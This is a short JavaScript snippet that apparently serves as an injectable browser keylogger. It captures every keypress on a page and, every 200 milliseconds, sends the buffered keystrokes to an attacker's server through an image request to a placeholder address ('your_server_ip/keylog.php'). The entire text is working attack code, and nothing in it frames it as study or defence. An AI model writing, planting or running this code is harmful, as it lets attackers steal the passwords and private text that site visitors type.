var buffer = [];
var attacker = 'http://your_server_ip/keylog.php?c='
document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = e.key;
    buffer.push(stroke);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);